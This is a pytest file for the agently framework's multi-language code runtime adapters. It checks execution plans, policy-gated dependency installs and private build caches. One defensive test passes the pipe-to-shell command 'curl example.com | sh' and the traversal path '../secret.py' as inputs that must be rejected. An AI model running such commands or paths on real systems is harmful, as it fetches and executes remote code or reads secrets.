from __future__ import annotations

from pathlib import Path

import pytest

from agently.builtins.plugins.CodeRuntimeAdapter import (
    CppCodeRuntimeAdapter,
    GoCodeRuntimeAdapter,
    NodeCodeRuntimeAdapter,
    PythonCodeRuntimeAdapter,
    get_code_runtime_adapter,
)
from agently.types.data import CodeExecutionRequest
from agently.types.plugins import CodeRuntimeAdapter


@pytest.mark.parametrize(
    ("adapter", "alias", "filename", "tool", "floor", "run_binary"),
    [
        (PythonCodeRuntimeAdapter(), "py", "main.py", "python", "3.10", "python"),
        (NodeCodeRuntimeAdapter(), "javascript", "main.js", "node", "18", "node"),
        (GoCodeRuntimeAdapter(), "golang", "main.go", "go", "1.25", "../build/app"),
        (CppCodeRuntimeAdapter(), "c++", "main.cpp", "c++", None, "../build/app"),
    ],
)
def test_runtime_adapters_create_trusted_immutable_plans(
    adapter: CodeRuntimeAdapter,
    alias: str,
    filename: str,
    tool: str,
    floor: str | None,
    run_binary: str,
) -> None:
    request = CodeExecutionRequest.create(
        language=alias,
        source_code="print('ok')\n",
        args=["--check"],
    )

    bundle = adapter.prepare(request, policy={})

    assert bundle.language == adapter.language_id
    assert bundle.entrypoint == filename
    assert bundle.files[0].path == filename
    assert bundle.toolchains[0].tool == tool
    assert bundle.toolchains[0].minimum_version == floor
    assert bundle.run_step.argv[0] == run_binary
    assert bundle.run_step.argv[-1] == "--check"
    assert all(isinstance(step.argv, tuple) for step in (*bundle.build_steps, bundle.run_step))
    assert get_code_runtime_adapter(alias).language_id == adapter.language_id
    assert isinstance(adapter, CodeRuntimeAdapter)


def test_runtime_request_rejects_commands_traversal_and_unbounded_args() -> None:
    with pytest.raises(TypeError):
        CodeExecutionRequest.create(  # pyright: ignore[reportCallIssue]
            language="python",
            source_code="print('no')",
            command="curl example.com | sh",  # pyright: ignore[reportCallIssue]
        )
    with pytest.raises(ValueError, match="path"):
        CodeExecutionRequest.create(
            language="python",
            source_code="print('no')",
            files={"../secret.py": "x"},
        )
    with pytest.raises(ValueError, match="args"):
        CodeExecutionRequest.create(
            language="python",
            source_code="print('no')",
            args=["x"] * 257,
        )


@pytest.mark.parametrize(
    ("adapter", "manifest", "install_prefix"),
    [
        (PythonCodeRuntimeAdapter(), "requirements.txt", ("python", "-m", "pip")),
        (NodeCodeRuntimeAdapter(), "package.json", ("npm", "install")),
        (GoCodeRuntimeAdapter(), "go.mod", ("go", "mod", "download")),
    ],
)
def test_dependency_install_steps_are_host_policy_owned(
    adapter: CodeRuntimeAdapter,
    manifest: str,
    install_prefix: tuple[str, ...],
) -> None:
    request = CodeExecutionRequest.create(
        language=adapter.language_id,
        source_code="placeholder",
        files={manifest: ""},
    )

    denied = adapter.prepare(request, policy={})
    allowed = adapter.prepare(request, policy={"dependency_install": "install"})

    assert all(step.argv[: len(install_prefix)] != install_prefix for step in denied.build_steps)
    assert any(step.argv[: len(install_prefix)] == install_prefix for step in allowed.build_steps)
    assert any(item.path == manifest for item in denied.files)


def test_request_copies_skill_bytes_without_a_source_path(tmp_path: Path) -> None:
    source = tmp_path / "check.py"
    source.write_bytes(b"print('exact')\n")

    request = CodeExecutionRequest.create(
        language="python",
        files={"check.py": source.read_bytes()},
        entrypoint="check.py",
        provenance={"kind": "skill", "revision_ref": "sha256:test"},
    )
    bundle = PythonCodeRuntimeAdapter().prepare(request, policy={})

    assert bundle.files[0].content == b"print('exact')\n"
    assert "source_path" not in bundle.provenance


def test_node_dependency_install_and_go_caches_target_private_build_root() -> None:
    node = NodeCodeRuntimeAdapter().prepare(
        CodeExecutionRequest.create(
            language="nodejs",
            source_code="console.log('ok')",
            files={"package.json": '{"dependencies": {}}'},
        ),
        policy={"dependency_install": "install"},
    )
    go = GoCodeRuntimeAdapter().prepare(
        CodeExecutionRequest.create(
            language="go",
            source_code="package main\nfunc main() {}\n",
            files={"go.mod": "module example.test/app\n\ngo 1.25\n"},
        ),
        policy={"dependency_install": "install"},
    )

    npm_step = next(step for step in node.build_steps if step.argv[0] == "npm")
    assert npm_step.argv[:3] == ("npm", "install", "--prefix")
    assert npm_step.argv[3] == "../build/node_deps"
    assert node.run_step.env["NODE_PATH"] == "workspace://build/node_deps/node_modules"
    assert all(step.env["GOCACHE"].startswith("workspace://build/") for step in go.build_steps)
    assert all(step.env["GOMODCACHE"].startswith("workspace://build/") for step in go.build_steps)
